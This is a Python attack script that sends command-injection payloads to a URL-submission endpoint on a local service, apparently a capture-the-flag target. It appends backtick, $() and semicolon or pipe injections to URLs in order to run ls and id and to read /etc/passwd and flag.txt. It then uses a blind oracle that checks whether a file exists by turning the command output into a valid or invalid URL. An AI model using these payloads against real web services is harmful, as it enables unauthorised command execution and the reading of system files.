import requests

BASE_URL = "http://127.0.0.1:32998/add_url"

def test(payload):
    data = f"url={payload}"
    try:
        resp = requests.post(BASE_URL, headers={"Content-Type": "application/x-www-form-urlencoded"}, data=data, timeout=10)
        return resp.status_code, len(resp.text)
    except:
        return "ERROR", 0

print("Testing URL-based injection...")

# Try starting with valid URL then appending command output
tests = [
    # Start with valid URL
    ("https://example.com", "valid URL only"),
    
    # Append command output
    ("https://example.com`echo a`", "URL + echo a"),
    ("https://example.com`echo 1`", "URL + echo 1"),
    ("https://example.com`cat /etc/passwd`", "URL + passwd"),
    
    # Try different injection points
    ("https://example.com/;ls", "URL + ;ls"),
    ("https://example.com/|ls", "URL + |ls"),
    ("https://example.com/`ls`", "URL + `ls`"),
    
    # Using $()
    ("https://example.com$(echo a)", "URL + $(echo a)"),
    ("https://example.com$(ls)", "URL + $(ls)"),
    
    # URL encoded
    ("https://example.com%60id%60", "URL + encoded backticks"),
    
    # Try with command working if file exists
    ("https://example.com`[ -f flag.txt ] && cat flag.txt`", "conditional flag read"),
    ("https://example.com`[ -f /app/flag.txt ] && cat /app/flag.txt`", "conditional /app/flag read"),
    ("https://example.com`[ -f /etc/passwd ] && cat /etc/passwd`", "conditional passwd read"),
]

for payload, desc in tests:
    status, length = test(payload)
    print(f"{desc}: Status={status}, Len={length}")

# Try finding files with valid-URL-output approach
print("\n\nFinding files with valid-URL-based detection...")

# Replace output with valid URL format
file_tests = [
    # If file exists, output starts with http which is valid
    ("http`[ -f flag.txt ] && echo 's://x.com' || echo '://invalid'`", "flag.txt via URL"),
    ("http`[ -f /app/flag.txt ] && echo 's://x.com' || echo '://invalid'`", "/app/flag.txt via URL"),
    ("http`[ -f /etc/passwd ] && echo 's://x.com' || echo '://invalid'`", "/etc/passwd via URL"),
    
    # Alternative: Use grep to check content
    ("http`grep -q 'root' /etc/passwd 2>/dev/null && echo 's://found.com'`", "grep root in passwd"),
]

for payload, desc in file_tests:
    status, length = test(payload)
    print(f"{desc}: Status={status}")

